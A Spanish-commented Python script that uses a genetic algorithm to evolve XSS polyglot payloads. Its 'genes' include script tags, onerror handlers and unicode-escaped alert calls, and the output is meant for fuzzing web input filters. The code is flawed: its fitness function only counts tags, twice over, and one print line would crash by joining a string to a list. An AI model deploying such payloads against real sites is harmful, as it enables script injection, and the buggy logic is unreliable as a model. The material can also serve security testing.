# -*- coding: utf-8 -*-
import random
import re


# Función para seleccionar aleatoriamente k elementos de una lista
def random_choices(population, k):
    return [random.choice(population) for _ in range(k)]

# Función para evaluar la sintaxis HTML correcta
#   Simulación de la evaluación de sintaxis
#   A futuro incroporar selenium y tidy
def evaluar_html(individuo):
    
    errores = re.findall(r'<[^>]*[^>]*>', individuo)
    warnings = re.findall(r'<[^>]*[^>]*>', individuo)
    return len(errores) + len(warnings)

# Inicialización de la población
#   Creamos inviduos (payloads) con apartir de genes (segmentos de HTML/JS) random
def inicializar_poblacion(tamano_poblacion, longitud_individuo, genes):
    poblacion = []
    for _ in range(tamano_poblacion):
        individuo = ''.join(random_choices(genes, k=longitud_individuo))
        poblacion.append(individuo)
    return poblacion

# Evaluación del fitness / Selección
#   Aplicamos la funciòn objetivo y cuantificamos cantidad de errores y warning
def evaluar_poblacion(poblacion):
    return [evaluar_html(individuo) for individuo in poblacion]

# Selección (modalidad de torneo)
#  Chico de micro: todos al azar, solo los 3 mejores son elegidos
def seleccion_torneo(poblacion, fitness, k=3):
    seleccionados = []
    for _ in range(len(poblacion)):
        aspirantes = random.sample(range(len(poblacion)), k)
        mejor = max(aspirantes, key=lambda x: fitness[x])
        seleccionados.append(poblacion[mejor])
    return seleccionados

# Cross-over (Encruzamiento) - Two-point Cross over
#  Cruza 2 individuos (papa1, papa2) y genera 2 hijos
def crossover(padre1, padre2):
    punto1, punto2 = sorted(random.sample(range(1, len(padre1)), 2))
    hijo1 = padre1[:punto1] + padre2[punto1:punto2] + padre1[punto2:]
    hijo2 = padre2[:punto1] + padre1[punto1:punto2] + padre2[punto2:]
    return hijo1, hijo2

# Mutación
#  Cambia aleateriamente un gen
def mutacion(individuo, genes, tasa_mutacion=0.3):
    # Convierte el individuo en una LISTA de caracteres
    nuevo_individuo = list(individuo) 
    
    # Itera sobre cada gen (caracter)
    for i in range(len(individuo)):

        # Muta el 30 % de las ocasiones seleccionando un gen random de la lista
        if random.random() < tasa_mutacion:
            nuevo_individuo[i] = random.choice(genes)

    return ''.join(nuevo_individuo)

# Algoritmo genético :)
def algoritmo_genetico(tamano_poblacion, longitud_individuo, generaciones_maximas=100, puntuacion_objetivo=3.0):

    # Parámetros
    genes = [
    "<script>", "</script>", "<a/", "</a>", "<img%s", "<img/>", "</img>",
    "src=x%s", "src=/%s", "src=saivs.js%s", "type=&quot;image&quot;%s",
    "type=&quot;text/x-scriptlet&quot;%s", "onerror=javascript:alert();",
    "onerror=\\u0061lert();", "onerror=al\\u0065rt();", "javascript:alert();",
    "javascript:al\\u0065rt();"
    ]

    poblacion = inicializar_poblacion(tamano_poblacion, longitud_individuo, genes)
    print("[Alg. Gen.] Población inicial:")
    print(poblacion)

    # Itera las generacione deseadas
    for generacion in range(generaciones_maximas):

        print("[Alg. Gen.] Calculando fitness...")
        fitness = evaluar_poblacion(poblacion)
        media_puntuacion = sum(fitness) / len(fitness)
        print("[Alg. Gen.] Generación:" + str(generacion) + ", puntuación media = " + str(media_puntuacion))
        
        # Terminación del algoritmo
        if media_puntuacion >= puntuacion_objetivo:
            print('[Alg. Gen.] Objetivo alcanzado. Terminando...')
            break
        
        # Lista los mejores individuos (Selección)
        seleccionados = seleccion_torneo(poblacion, fitness)
        print("[Alg. Gen.] Individuos:")
        print(seleccionados)
        
        # CrossOver
        nueva_poblacion = []
        
        # Selecciona 2 Individuos a la vez y los cruza
        for i in range(0, len(seleccionados), 2): 

            if i + 1 < len(seleccionados):
                hijo1, hijo2 = crossover(seleccionados[i], seleccionados[i+1])
                nueva_poblacion.extend([hijo1, hijo2])
            else:
                nueva_poblacion.append(seleccionados[i]) # Si solo hay uno continua (impares)
        
        # Aplica mutación a la nueva población
        poblacion = [mutacion(individuo, genes) for individuo in nueva_poblacion]
        print("[Alg. Gen.] Nueva población:\n"  + poblacion)
    
    # Terminación del algoritmo
    mejor_individuo = max(poblacion, key=evaluar_html)
    print("[Alg. Gen.] Mejor individuo: " + mejor_individuo + " con puntuación " + str(evaluar_html(mejor_individuo)))
    return mejor_individuo



######################
# Use
# payload_polyglot_genetic = algoritmo_genetico(tamano_poblacion=10, longitud_individuo=6)
#######################

